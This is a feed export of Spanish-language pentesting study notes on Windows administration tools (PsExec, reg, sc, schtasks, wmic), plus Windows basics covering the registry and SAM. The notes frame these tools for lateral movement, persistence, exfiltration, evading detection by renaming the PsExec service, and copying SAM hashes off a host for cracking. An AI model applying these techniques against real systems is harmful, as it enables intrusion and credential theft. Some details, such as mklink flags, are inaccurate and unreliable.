# REG_DWORD (Integer, 32-bit decimal number)
# REG_BINARY (Binary, hex value)
Copy<br>
<br>Personalización del nombre de Servicio: PsExec permite la personalización del nombre de servicio haciendo uso de la flag -r. Esto puede ser muy útil para evadir detecciones o ocultar/disfrazar la prescencia de PsExec en el sistema víctima, el nombre por defecto de este servicio es PsExecsvc. 
<br># Run a cmd instance in the remote system with the service "dobliuwsvc" insted PsExecsvc
&gt; psexec -r dobliuwsvc \\{hostname} cmd.exe
Copy<br>Tener en cuenta que la ejecución de psexec será posible siempre y cuando estemos intentando acceder remotamente al sistema víctima desde un sistema Windows, en caso de hacer uso de sistemas operativos basados en Linux, podríamos hacer usos de herramientas como impacket-psexec provenientes de la suite de impacket u otras alternativas como:<br>
<br>Metasploit psexec (msf &gt; use exploit/windows/smb/psexec).
<br>Cobalt Strike (Utiliza C$ y ADMIN$ para movimiento lateral).
<br>Empire PsExec (MITRE ATT&amp;CK: T1035, T1077).
<br>Cualquier framework de C&amp;C, podríamos descargar el código y compilarlo con diferentes nombres para los valores, nombres de "pipes", etc.
<br>Con PsExec podríamos:<br>
<br>
Crear cuentas en los equipos remotos (T1136.002).

<br>
Modificar o crear procesos, podríamos escalar privilegios mediante la flag -s (Trasladarnos de Administrator a SYSTEM | T1543.003). 

<br>
Utilizarlo como herramientas de transferencia de archivos lateral (T1570).

<br>
Escribir programas en ADMIN$ y ejecutar comandos en los sistemas remotos (T1021.002).

<br>
Recursos: <a data-tooltip-position="top" aria-label="https://www.mindpointgroup.com/blog/lateral-movement-with-psexec" rel="noopener nofollow" class="external-link" href="https://www.mindpointgroup.com/blog/lateral-movement-with-psexec" target="_blank">Movimiento lateral con PsExec</a>

]]></description><link>https://dobliuw.com/notes/3.-system/operative-systems/windows/administration/psexec.html</link><guid isPermaLink="false">Notes/3. System/Operative Systems/Windows/Administration/PSEXEC.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 14 May 2024 21:28:52 GMT</pubDate></item><item><title><![CDATA[REG]]></title><description><![CDATA[ 
 <br><br>El comando reg en Windows nos permite interactuar con el Registro de Windows, esté se encuentra mencionado y explicado en la sección de <a data-href="0. Windows Basics" href="https://dobliuw.com/notes/3.-system/operative-systems/windows/0.-windows-basics.html" class="internal-link" target="_self" rel="noopener nofollow">0. Windows Basics</a>. <br># Adding a registry key
&gt; reg add HKCU\Software\DobliuwSoftwareExample
# Adding a registry key and value
&gt; reg add HKCU\Software\DobliuwSoftwareExample /v name /t REG_SZ /d "Dobliuw"
# Deleting a registry key 
&gt; reg delete HKCU\Software\DobliuwSoftwareExample
# Exporting a registry key to a file
&gt; reg export HKCU\Software\DobliuwSoftwareExample C:\Users\dobliuw\Desktop\dobliuw_software_backup.reg
# Importing a registry file
&gt; reg import C:\Users\dobliuw\Desktop\backups\softwareBackup.reg
# Querying a registry key value
&gt; reg query HKCU\Software\DobliuwSoftwareExample /v name
# Querying all subkeys and values under a key
&gt; reg query HKCU\Software\DobliuwSoftwareExample /s
# Querying all values under a key
&gt; reg query HKCU\Software\DobliuwSoftwareExample /v *
# Setting the value of a registry key
&gt; reg add HKCU\Software\DobliuwSoftwareExample /v name /t REG_DWORD /d 0
Copy]]></description><link>https://dobliuw.com/notes/3.-system/operative-systems/windows/administration/reg.html</link><guid isPermaLink="false">Notes/3. System/Operative Systems/Windows/Administration/REG.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 15 May 2024 02:02:02 GMT</pubDate></item><item><title><![CDATA[Service Control Manager]]></title><description><![CDATA[ 
 <br><br>El comando sc en Windows es utilizado para comunicarnos con el Service Control Manager y servicios. Nos permite crear, modificar, arrancar, detener y consultar servicios en un sistema de manera local o remota.<br># Querying service status
&gt; sc query {service_name}
# Starting a service
&gt; sc start {service_name}
# Create a service
&gt; sc create "DobliuwSvc" binPath="C:\Path\to\exectuable.exe"
# Delete a service
&gt; sc delete {service_name}
# Changig service configuration
&gt; sc config {service_name} start=auto
# Querying service dependencies
&gt; sc qc {service_name}
# Granting service permissions
&gt; sc sdset {service_name} D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
Copy]]></description><link>https://dobliuw.com/notes/3.-system/operative-systems/windows/administration/sc.html</link><guid isPermaLink="false">Notes/3. System/Operative Systems/Windows/Administration/SC.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 15 May 2024 13:27:24 GMT</pubDate></item><item><title><![CDATA[Schedule tasks]]></title><description><![CDATA[ 
 <br><br>Las tareas programadas son eventeos que han sido programadas para correr en cierto intervalo de tiempo, como puede ser una vez al día, una vez por ahora o una vez por semana. Estas tareas pueden ser utilizadas para automatizar múltiples actividaes. De cara a nosotros, así como de los ciberdelincuentes, esta funcionalidad es crucial por diversos motivos.<br>
<br>Persistence: Los atacantes pueden establecer persistencia en un sistema comprometido y mantener acceso abusando de tareas programadas para ejecutar código malicioso en intervalos regulares, asegurando el acceso continuo al sistema incluso luego del ingreso al sistema inicial.
<br>Payload Delivery: Las tareas programadas pueden ser utilizadas para la entrega de payloads o ejecución de scripts maliciosos en el sistema. Creando una tarea programada para correr un payload específico en un determinado tiempo o evento que detone a esta, un atacante podría automatizar la ejecución de código malicioso.
<br>Privilege Escalation: También pueden ser utilizadas para aumentar nuestro privilegio, especialmente si esta configuradas para ejecutarse por medio de una cuenta privilegiada o de sistema. Explotando misconfiguration scheduled tasks podríamos ganar privilegios y comprometer potencialmente el sistema.
<br>Data Exfiltration: También podríamos hacer uso de estas para en intervalos regulares de tiempo seleccionables exfiltrar información sensible del sistema comprometido hacia el C&amp;C. Programando tareas para transferir archivos o ejecutar comandos de red, los atacantes podrían extraer información confidencial.
<br>Lateral Movement: Las tareas programadas también pueden facilitarnos el trabajo de movernos lateralmente a otros equipos dentro de la red ejecutando comandos o scripts en sistemas remotos. Un atacante podría ganar acceso a un sistema, hacer uso de las tareas programadas para pivotear (<a data-href="Pivoting" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/pivoting/pivoting.html" class="internal-link" target="_self" rel="noopener nofollow">Pivoting</a>) a otro sistema y expandir su foothold. 
<br>Evasion: Los atacantes podrían utilizar estas tareas para evadir detecciones de herramientas de seguridad o antivirus. Al programar actividades maliciosas fuera del horario laboral o utilizar nombres de tareas que parezcan legítimas, los atacantes podrían pasar desapercibidos y evitar la detección por parte de las defensas automatizadas.
<br><br><br>El comando schtasks en Windows nos permite crear schedule tasks o tareas programadas para que se ejecuten en un momento específico. Nos permite crear, eliminar, consultar, cambiar, ejecutar y finalizar tareas programadas en un sistema local o remoto.<br># Display help panel
&gt; schtasks /?
&gt; schtasks /create /?
&gt; schtasks /query /?
# ... We can display help panel for each option

# Create a new scheduled task
&gt; schtasks /create /tn "DobliuwTask" /tr "C:\Path\To\The\Executable.exe" /sc daily /st 09:00
# Delete a scheduled task
&gt; schtasks /delete /tn "DobliuwTask"
# Query scheduled task
&gt; schtasks /query
# Run a scheduled task
&gt; schtasks /run /tn "DobliuwTask"
# Change properties of a scheduled task
&gt; schtasks /change /tn "DobliuwTask" /tr "C:\NewPath\To\The\Executable.exe" /sc weekly
# End a running scheduled task
&gt; schtasks /end /tn "DobliuwTask"
# Export a scheduled task to XML
&gt; schtasks /query /tn "DobliuwTask" /xml &gt; DobliuwTaskExported.xml
# Import a scheduled task from XML
&gt; schtasks /create /xml /DobliuwTask.xml /tn "DobliuwTask"
Copy]]></description><link>https://dobliuw.com/notes/3.-system/operative-systems/windows/administration/schtasks.html</link><guid isPermaLink="false">Notes/3. System/Operative Systems/Windows/Administration/SCHTASKS.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 15 May 2024 13:52:01 GMT</pubDate></item><item><title><![CDATA[Windows Management Instrumentation Command-Line]]></title><description><![CDATA[ 
 <br><br>wmic (Windows management Instrumentation Command-line) es una herramienta de línea de comandos poderosa para los administradores de sistemas Windows y, por ende, para los pentesters... Provee una interfaz de línea de ocmandos para la infraestructura WMI, permitiendo a los usuarios consultar información del sistema, realizar tareas administrativas y manejar componentes del sistema de manera remota. Algunos de los usos más importantes a destacar como pentesters es:<br>
<br>System Enumeration: Los pentesters podemos hacer uso de wmic para obtener información detallada acerca del sistema comprometido y auditado, incluyendo especificaciones del hardware, softwares instalados, processo corriendo, cuentas de usuario y configuraciones de red. Esta información nos puede ayudar a entender el entorno auditado así como a identificar potenciales vulnerabilidades.
<br><a data-href="RCE - (Remote Command Execution)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/rce-(remote-command-execution).html" class="internal-link" target="_self" rel="noopener nofollow">RCE - (Remote Command Execution)</a>: wmic puede ser aprovechado por los pentesters o ciberdelincuentes para la ejecución arbitraria de comandos o scripts en el sistema remoto. A través de la explotación de permisos mal configurados o vulnerabilidades, los atacantes podrían ejecutar código malicioso remotamente haciendo uso de comandos wmic.
<br>Privilege Escalation: Los comandos de wmic pueden ejecutarse con privilegios elevados, especialmente si se ejecutan en un contexto de un usuario adminitrador. Los pentesters o ciberdelincuentes podrían abusar de wmic para escalar privilegios en el sistema comprometido ejecutando comandos privilegiados o modifcando configuraciones críticas del sistema.
<br>Lateral Movement: wmic habilita a los pentesters y ciberdelincuentes la capacidad de llevar a cabo movimiento lateral dentro de la red a través de la ejecución de comandos o scripts. Explotando autenticaciones debiles o permisos mal configurados, los atacantes podrían pivotear (<a data-href="Pivoting" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/pivoting/pivoting.html" class="internal-link" target="_self" rel="noopener nofollow">Pivoting</a>) entre sistemas y expandir su foothold. 
<br>Data collection: Los pentesters y ciberdelincuentes también podrían hacer uso de esta herramienta para la colección de información sensible y crítica en el sistema vícitma, incluyendo datos sensibles, entradas de registro, event logs y ajustes de configuración.
<br># Show posible information to consult
&gt; wmic /?
&gt; wmic os
&gt; wmic cpu
&gt; wmic bios
# And more options that we can consutl

# Get OS information
&gt; wmic os get Caption, OSArchitecture, Version
# Get CPU information
&gt; wmic cpu get Name, MaxClockSpeed, NumberOfCores
# Get BIOS information
&gt; wmic bios get Manufacturer, SMBIOSBIOSVersion, ReleaseDate
# Get Memory information
&gt; wmic memorychip get BankLabel, Capacity, Speed
# Get disk drive information
&gt; wmic diskdrive get Model, Size, InterfaceType
# List installed software
&gt; wmic product get Name, Version
# Get network adapter information
&gt; wmic nicconfig get Caption, IPAddress, MACAdress
# Get user account information
&gt; wmic useraccount get Name, FullName, Description
# Get logical disk information
&gt; wmic logicaldisk get caption,desription,providername
# Start a service
&gt; wmic service where "name='{service_name}'" call startservice
# Stop a service
&gt; wmic service where "name='{service_name}'" call stopservice
# Restart a service
&gt; wmic service where "name='{service_name}'" call restarservice
# Enable a remote desktop
&gt; wmic /namespace:\\root\CIMv2\TerminalServices PATH Win32_TerminalServiceSetting WHERE (__Class !="") CALL SetAllowTSConnections 1
# Disable a remote desktop
&gt; wmic /namespace:\\root\CIMv2\TerminalServices PATH Win32_TerminalServiceSetting WHERE (__Class !="") CALL SetAllowTSConnections 0
# Querying running process
&gt; wmic process list brief
&gt; tasklist
# Termina a process
&gt; wmic process where "name='notepad.exe'" delete
Copy]]></description><link>https://dobliuw.com/notes/3.-system/operative-systems/windows/administration/wmic.html</link><guid isPermaLink="false">Notes/3. System/Operative Systems/Windows/Administration/WMIC.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 15 May 2024 18:24:16 GMT</pubDate></item><item><title><![CDATA[Windows Versions]]></title><description><![CDATA[ 
 <br><br>Debido a la peculiar manera de Microsoft de nombrar las distintas versiones de su sistema operativo, puede ser bastante complejo entender ante que sistema nos estamos enfrentando, por lo que a continuación se adjunta una de las distintas versions de Windows Desktop y Windows Servers. <a data-href="0.1 Windows Versions" href="https://dobliuw.com/notes/3.-system/operative-systems/windows/0.1-windows-versions.html" class="internal-link" target="_self" rel="noopener nofollow">0.1 Windows Versions</a>.<br><br><br>Como sabemos, en informática un Directory Structure o Estructura de Directorios es la manera en la que el sistema operativo organiza archivos para que son accesibles al usuario. Mayormente esta organización se da en <a data-tooltip-position="top" aria-label="https://en.wikipedia.org/wiki/Tree_structure" rel="noopener nofollow" class="external-link" href="https://en.wikipedia.org/wiki/Tree_structure" target="_blank">jerarquía de estructura de árbol</a>. <br>En CP/M, DOS, Windows y OS/2, el directorio root es "drive:\", por ejemplo, en sistemas modernos, el directorio root es mayormente "C:\". El directorio es usualmente sepadao por \, pero muchos sistemas operativos internamente reconocen el /. Unidades virtuales y fisicas son llamadas por una letra de unidad, en lugar de combinarse como una sola, lo que indica que las unidades no se combinan para formar una única secuencia de letras de unidad, cada dispositivo o ubicación se representa con su propia letra de unidad independiente.<br>A partir de Windows 10 la estructura de directorios que puede aparecer en la raíz de una paritción de inicio es:<br>
<br>
\PerfLogs: Puede almacenar registros de renfimiento de Windows, pero en una configuración por default, estará vacío.

<br>
\Program Files: 

<br>En arquitecturas de 32 bits todos los programas (16-bit y 32-bit) serán instalados en esta carpeta.
<br>En arquitecturas de 64 bits todos los programas de 64-bit serán instalados en esta carpeta.


<br>
\Program Files (x86): Este directorio aparece en arquitecturas de 64 bits de Windows. Aquellos programas de 32-bit o 16-bit serán instalados por defecto en esta carpeta, incluso aunque los programas de 16 bits no se ejecutan en WIndows de 64 bits.

<br>
\ProgramData (Hidden): Almacena datos compartidos entre cuentas de usuario, esto puede inlcuir archivos de configuración, datos de aplicaciones, plantilas, etc. Aunque los datos están destinados a ser compartidos, no todos los datos dentro de este directorio son accesibles para todos los usarios sin limitación de privilegios.

<br>
\Users: Carpeta que almacena carpetas con los perfiles de usuarios. Esta carpeta contiene una subcarpeta por cada usuario que se ha logueado en el sistema almenos una vez. Además, posee otras dos carpetas, Public y Default (Hidden). También tienen dos elementos similares a carpetas llamadas Default User (Un punto de unión NTFs a la carpeta Default) y All Users (Un enlace simbólico NTFS a C:\ProgramData).<br>
- Tanto un NTFS junction piont (Punto de union NTFS) como un simbolick link NTFS (Enlace simbólico NTFS) son características del sistema de archivos NTFS (New Technology File System) de Windows que permite crear referencias a directorios o archivos en otras ubicaciones del sistema de archivos. Sin embargo tiene algunas diferencias importantes:<br>
- Junction Point NTFS:  Es un tipo de enlace que permite a un directorio ser montado en otro punto dentro del mismo volumen NTFS. Es decir, el contenido del directorio montado se muestra dentro del directorio de destino como si fuera parte de él. A su vez, este es transparente para las aplicaciones, lo que quiere decir que las apps que acceden a este directorio no son conscientes de que están accediendo a un junction point. Es importante tener en cuenta que estos no pueden vincular directorios entre diferentes unidades o volúmenes. mklink /J {name_of_new_folder_junction} {path_target_to_aim}<br>
- Symbolick Links NTFS: Es un tipo de enlace que permite apuntar a archivos o directorios, y puede atraves volúmenes, lo que significa que puede vincular elementos entre diferentes unidades o volúmenes. mklink /H {name_of_new_symbolick_link_file} {path_target_to_aim_file} (Usar /D para directorios)<br>
La diferencia entre un junction point de un symbolick link de tipo directorio es que el primero se usa específicamente para montar un directorio dentro de otro, este a su vez no puede atravesar volumenes y existe desde versiones anteriores de Windows 2000.

<br>
\Public:  Esta carpeta sirve como un buffer para compartir archivos entre usuarios de una computadora. Por defecto esta carpeta es accesible para todos los usuarios que puedan iniciar sesión. También, por defecto, esta carpeta se comparte a través de la red, aunque se deniega el acceso anónimo. Esta carpeta contiene datos del usuario y no datos del programa, lo que siginifica que los usuarios sean los únicos que decida qué hay en esta carpeta y cómo se organiza. 

<br>
{username}\AppData (Hidden): Esta carpeta almacena datos y configuraciones de aplicaciones instaladas por el usuario.  Esta carpeta contiene tres subcarpetas: Roaming, Local y LocalLow.

<br>Roaming: Almacena datos específicos de aplicaciones que son relevantes para el usuario en diferentes equipos o dispositivos de red. Estos datos se sincornizan esntre diferentes equipos en los que el usuario inicie sesión, lo que permite una experiencia coherente en múltiples dispostivios. Las aplicaciones pueden usar esta carpeta para almacenar configuraciones, datos de usuario y otra información que debe estar disponible en todos los dispositivos donde el usuario inicie sesión.
<br>Local: Contiene datos específicos de las aplicaciones que son relevantes solo para el usuario actual. Estos datos pueden inlcuir cachés de aplicaciones, datos temporales y otra información que no se sincroniza ni se comparte con otros usuairos del mismo equipo  ocon otros dispositivos.
<br>LocalLow: Similar a Local, pero generalmente utilizada por aplicaciones que requiere permisos limitados o tienen restricciones de seguridad más estrcitas. Las aplicaciones suelen almacenar datos en está cunado necesitan acceder a recursos en un nivel de integridad más bajo, como aplicaciones basadas en Internet Explorer y algunos juegos.


<br>
\Windows: Windows en si mismo será instalado dentro de esta carpeta.

<br>\System: Este subdirectorio de C:\Windows almacena DLLs para archivos de 16-bits, lo que indicá que esta carpeta estará vacia en sistemas de 64 bits.
<br>\System32: En este caso almacena archivos del sistema operativos Windows de 32 bits escenciales para el funcionamiento del sistema. Aquí se encuentran muchas de las bibliotecas de enlace dinámico (DLL) y otros archivos fundamentales para el sistema operativo.
<br>\SysWOW64: En arquitecturas de 64 bits contiene archivos del sistema operativo de 32 bits necesarios para la compatibilidad con aplicaciones de 32 bits. WOW significa Windows on Windows y se refeiere al subsitema de 32 bits en sistemas de 64 bits.


<br>
WinSxS: Esta carpeta es oficialmente llamada Windows Component Store y constituye la mayoria de Windows. Una copia de todos los comonentes de WIndows, como todas las actualizaciones de Windows y los service packs son almacenados en esta carpeta. Empezando por Windows 7 y Windows Server 2008 R2, Windows automaticamente busca esta carpeta para mantener su tamaño. Por razones de seugridad y para evitar el problema <a data-tooltip-position="top" aria-label="https://en.wikipedia.org/wiki/DLL_Hell" rel="noopener nofollow" class="external-link" href="https://en.wikipedia.org/wiki/DLL_Hell" target="_blank">DLL Hell</a>, Windows impone requisitos muy estrcitos sobre cómo se organizan los archivos en esta carpeta.

<br><a data-tooltip-position="top" aria-label="https://en.wikipedia.org/wiki/Directory_structure#cite_note-7" rel="noopener nofollow" class="external-link" href="https://en.wikipedia.org/wiki/Directory_structure#cite_note-7" target="_blank">Fuente parcial utilizada para esta sección.</a><br><br><br>Windows permite la creación de redes para compartir recursos y facilitar la colaboración entre usuarios, existen casi principalmente dos maneras de estructurar una red Windows. Una es usando un tipo de modelo server-client llamado Domain y otra es a través del tipo peer-to-peer denominado modelo Worksgroup.<br><br>El modelo peer-to-peer (P2P) es una estructura de red en la que todas las computadoras conectadas tiene igual autoridad y pueden actuar tanto como cliente como servidor. En el contexto de Windows, este modelo se implementa a través de lo que se conoce como un Workgroup.<br>
<br>Igualdad entre hosts: Todos los hosts en el Workgroup tiene roles similares y no hay un servidor centralizado.
<br>Recursos compartidos: Los hosts pueden compartir recursos como archivos, impresoras y dispositivos de almacenamiento directamente entre sí sin depender de un servidor central.
<br>Autenticación local: Cada host tiene su propia base de datos de cuentas de usuario y se autentica localmente. Esto significa que no hay un controlador de dominio central para administrar las cuentas de usuario y las políticas de seguridad.
<br>Configuración más simple: El modelo de Workgroup es más fácil de configurar y mantener en comparación con un dominio, especialmente para redes pequeñas y domésticas.
<br><br>Windows domain es un modelo de tipo server-client de red en el que los hosts y los usuarios están centralizados y administrados por un servidor central llamado Domain Controller. <br>
<br>Domain Controller: Hay almenos un servidor dedicado que actúa como controlador de dominio. Este servidor contiene una base de datos centralizada de cuentas de usuario, grupos, políticas de seguridad y otros objetos de red.
<br>Autenticación Centralizada: Todos los uaurios y hosts de la red se autentican con el DC central antes de acceder a los recursos de red. Esto permite una gestión centralizada de la autenticación y la aplicación de políticas de seguridad.
<br>Gestión de Políticas de Grupo (GPO): Se pueden aplicar políticas de grupo a usuarios y hosts en toda la red para controlar el acceso, la configuración del sistema y otras configuraciones.
<br>Recursos Compartidos Centralizados: Los recusos de red como archivos, impresoras y aplicaciones pueden ser compartidos y administrados centralmente a através del DC.
<br>Escalabilidad y Seguridad: El modelo de dominio es altamente escalable y ofrece un mayor nivel de seguridad y control en comparación con un Workgroup. Permite una gestión más granular de los recursos y el acceso a la red.
<br>Una red de hosts Windows con un modelo de dominio se puede gestionar utilizando Active Directory, este es un servicio de directorio de Microsoft que se utiliza para administrar y organizar los recursos de red en un entorno de dominio de Windows.<br>Algunas maneras de validar si nuestro Host pertenece a un dominio es con los comandos:<br>echo %loginServer%
# Esto devolvera el nombre del servidor contra el que nos autenticamos tras el inicio de sesión
# en caso de pertener a un dominio veríamos posiblemente el nombre del DC que suele tener DC en el nombre.
net config workstation
# Muestra la información de configuración de la workstation, incluido el nombre de domino al que está unido el sistema.
systeminfo
# Muestra gran cantidad de información de nuestro sistema, incluyendo el "Registered Organization" (Domain)
whoami /all 
# Muestra información detallada del usuario en uso incluyendo el nombre de dominio y grupo de seguridad 
dsquery * -limit 0
# Este comando puede utlilizarse para consultar objetos en un Active Directory, si este comando devuelve resultados
# es una manera potencial de reconocer nuestra pertenencia a un AD.
Copy<br><br><br><br>Es una cuenta del sistema incorporada con incluso mayores privilegios que el usuario Administrador. Esta cuenta es usada por el sistema operativo en si misma y por servicios del sistema para llevar a cabo tareas que requiere privilegios elevados. Es básicamente el "superuser" de windows. Esta cuenta contiene permisos sin restringir por lo que implica la capacidad de llevar a cabo tareas que la cuenta de Administrador no puede usar y no se espera que sea usada regularmente para tareas del día a día por parte de los usuarios del sistema.<br><br>Esta cuenta de usuario corresponde a la cuenta por defecto en Wnidows y es la cuenta con mayores privilegios en el sistema. Tiene un completo control sobre el sistema y puede llevar a cabo cualquier tarea, como la instalación de software, cambio en la configuración del sistema y manejar otras cuentas de usuario.<br><br>Los usuarios "normales" son usuarios del sistema que pueden variar los privilegios que poseen en base a la configuración y contexto del sistema, obviamente cuentan con privilegios mucho menores que los administradores. Podemos crear usuarios de la siguiente manera:<br># Create an especific user with an especific password
net user {username} {password} /add
# Add user to administrator group (Execute this action like administrator btw)
net localgroup administrators {username} /add
# Add user to Remote Desktop User group
net localgroup "Remote Desktop Users" {username} /add
# More handle of groups and user from cmd here:
# https://www.windows-commandline.com/add-user-to-group-from-command-line/
Copy<br><br><br>User Account Control, también conocido como UAC, es una funcionalidad introducida en Windows a partir de la versión de Windows Vista. Tiene como proposito principal, mejorar la seguridad del sistema operativo limitando los privilegios de las aplicaciones de fotware a menos qeu el usuario o un administrador les conceda permiso explícitamente. UAC ayuda a prevenir cambios no autorizados en el sistema al requerir aprobación explícita para acaciones que requieren privilegios administrativos.<br><img alt="UAC_example.png" src="https://dobliuw.com/lib/media/uac_example.png"><br><br><br>El Windows Registry (Registro de Windows) es una base de datos jerarquica en la que se almacenan configuracioes y opciones en el sistema operativo Windows. Contiene configuraciones para el sistema operativo en si mismo, aplicaciones instaladas y preferencia de usuarios. Estas configuraciones estan almacenadas y organizadas en un formato de keys and subkeys, de manera similar a como los archivos y carpetas se organizan en el sistema.<br>
<br>Estructura: El Registro esta organizado en forma de estrcutura de árbol que consiste en keys, subkeys y sus respectivos values. Cada key y subkey representa un aspecto específico en el sistema o en el software instalado.
<br>Hives/Colmenas: El Registro esta dividido entra varias secciones llamadas hives, cada una corresponde a una parte específica de la configuración del sistema. Las principales hives son:

<br>HKEY_CLASSES_ROOT
<br>HKEY_CURRENT_USER
<br>HKEY_LOCAL_MACHINE
<br>HKEY_USERS
<br>HKEY_CURRENT_CONFIG


<br>Keys and Values: Las keys son como la "carpeta" en el directorio del sistema, cada una de estas contiene otras keys o values. Los values son como los archivos, y estos contiene los datos reales o ajustes de configuración. Cada value dispone de un name, data type y data content. 
<br>Data Types: El Registro suporta varios tipos de datos para los valores, incluidos strings, binary data, DWORDs (Doble Words), QWORDs (Quad Words), multi-string values y expandable strings.
<br>Acceso y Edición: El acceso al Registro es curcial para la configuración y personalización del sistema, sin embargo, editar directamente el Registro puede ser riesgoso y puede conducir a la inestabilidad del sistema si no se hace de manera correcta. Es esencial ser precavido y realizar backups antes de cualquier cambio.
<br>Seguridad: El Registro juega un rol significante en la seguridad del sistema, dado que almacena información sensible como credencailes de usuarios, claves encriptadas y configuraciones de seguridad, proteger el Registro es esencial para el mantenimiento de la integridad del sistema y la protección contra accesos no autorizados.
<br>Para nosotros, este apartado es fundamental dado que nos puede permitir...<br>
<br>Identificar vulnerabilidades y misconfigurations.
<br>Analizar comportamiento de malware y mecanismos de persistencai.
<br>Modificar configuraciones del sistema para restear y experimentar.
<br>Solucionar problemas y errores del sistema.
<br><br># The main commmand that we'll use is reg, so like always we can try run this one with /?
# from cmd or powershell and the commando "get-help" following by this command from pshll 
reg /?
get-help reg
# To view a specific registry key using reg query 
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
# To view a specefic value within a key add /v
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion" /v CommonFilesDir
Copy<br><br># Creating a new key in the Registry using reg add
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Dobliuw"
Copy<br><br># Create a new value using reg add to but adding /v flag to the name of the value
# adding /t flag followed by the data type and /d flag for de data itself
# (REG_SZ used to strings)
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Dobliuw" /v Version /t REG_SZ /d "1.0"
Copy<br><br># Using reg with delete option to delete an specific key
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Dobliuw"
# Using reg with delete option to delete an specfici value 
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Dobliuw" /v Version
Copy<br>Es importante tener en cuen ta que esta base de datos jerarquica, denominada Registro de Windows contiene las denominadas ROOTKEYS, es decir, los puntos de inicio de esta base de datos. Estas ROOTKEYs proveen información para organizar y acceder a los ajustes de configuración alojados en el Registro.<br>Las dos ROOTKEYS principales son:<br>
<br>HKEY_LOCAL_MACHINE (HKLM): Esta root key contiene los ajustes de configuración que aplicaion a la computadora local. Almacena información acerca del hardware, software y ajustes del sistema que no corresponden especificamente a un usuario. Los cambios bajo esta root key pueden afectar a todos los usuarios del sistema.
<br>HKEY_CURRENT_USER (HKU): Esta root key cotiene ajustes de configuración por acada usuario que ha iniciado sesión en el sistema. Almacena preferencias y ajustes de usuarios específicos, como la customización del escritorio, ajustes de aplicaciones y variables de entornos.
<br>TIP: Recordar que el Registro de Windows es una base de datos Jerarquica que contiene HIVES, es decir "colmenas" y a su vez contiene KEYS, SUBKEYS y VALUES, por lo que HKEY no es más que las siglas de "Hives Keys".<br><br><br>SAM o Security Accounts Manager en Windows es un archivo de base de datos que almacena información sobre las cuentas, incluyendo usernames y passwords hashes. Esta se encuentra localizada en el directorio %SystemRoot%\System32\Config (Listar contenido de la variable de entorno con el comando echo).<br>La SAM es un componente critico en la infraestructura de seguridad de Windows, responsable de la auntenticación y autorización de usuarios durante el proceso de inicio de sesión, esto es lo que lo vuelve en un target común de los atacantes trás el ingreso al sistema para una posible escalada de privilegios, aunque es muy importante reconocer que habitualmente, acceder a esta base de datos requiere de permisos administrativos o contar con la fortuna de una misconfiguration para poder acceder a está y posteriormente con herramientas como hashcat, JohnTheRipper u otras intentar llevar a cabo un ataque de fuerza bruta para intentar crackear los hashes y obtener las credenciales en texto plano.<br>Las credenciales alojadas en esta base de datos estan en forma de hashes como se indicó previamente y estas estan encriptadas por varios algortimos como NTLM (NT LAN Manager) o Kerberos.<br>Teniendo en cuenta que en caso de contar con la posibilidad de extraer y hacer uso de la sam, quisieramos trasladar esta a nuestra máquina de atacante, pero es importante tener en cuenta que en Windows hacer este tipo de acciones suele requerir un trabajo más particular a diferencia de linux, por ejemplo para poder llevara cabo la transferencia de archivos desde una máquina Windows a otro host, podríamos hacer uso de algunos métodos o  protcolos que facilitar estra tansferencia.<br><br>
<br>Transferencia manual: Lógicamente este método se descarta cuando hacemos uso de un escenario en donde no contamos con accesibilidad física al host, pero tal vez en algunas auditorias o mismo para un uso normal, claramente lo primero que pensamos para llevar a cabo una transferencia de archivos entre un host Windows y un Linux, por ejemplo,es hacer uso de unidades USB, dispositivos de almacenamiento externo o a través de recursos compartidos a nivel de red haciendo uso de protocolos como SMB (Server Message Block).
<br>Para hacer uso del protocolo SMB desde windows, en caso de tener los permisos suficientes podríamos hacer uso de los siguientes comandos:<br># Visualize all shared folders
net share
# Visualize a specific shared folder
net share {share_name}
# Create shared folder with wide-open access
net share {share_name}={path} /GRANT:Everyone,FULL
# Delete a specific shared folder
net share {share_name} /DELETE
# If some issue is come up, check the Windows Event Viewer
eventvwr
Copy<br>Una vez compartido un determinado directorio y/o archivos a nivel de red, podríamos conectarnos de manera remota (Lógicamente estando en la misma red):<br>
<br>Windows:
<br># Create a drive assigned to a letter (x in this example) to could reference this drive 
# like smb folder wanted to consult and making an authentication with credentials
net use x: \\{ip_host_smb}\{share_folder_name} /user:{user} {password}
Copy<br>
<br>Linux:
<br># Try to connect to an specific host with a specific user
smbclient \\{ip_host_smb}\share_folder_name -U {user}
Copy<br>
<br>
File Transfer Protocol (FTP): Protocolos de transferencia de archivos como FTP (File Transfer Protocol), SCP (Secure Copy Protocol) o SFTP (SSH File Transfer Protocol) pueden ser utilizados para la transferencia de archivos entre hosts Windows y otros hosts Windows o Linux a través de la red. Podríamos configurar un servdiro FTP o SSH en la máquina Windows y hacer uso de clientes FPT o SCP en la máquina Linux, por ejemplo, para conectarnos a los servidores creados y descargar la SAM.

<br>
Herramientas de administración remota: Si estamos tratando con la transferencia de archivos en un entorno Windows-to-Windows, podríamos aprovechar las capacidades integradas de Windows Remote Desktop o PowerSHell Remoting para acceder de forma remota al sistema Windows y transferir archivos. Comandos de Powershell como Copy-Item o Invoke-Command puede ser usados para copiar archivos entre sistemas Windows a través de una red.

<br>
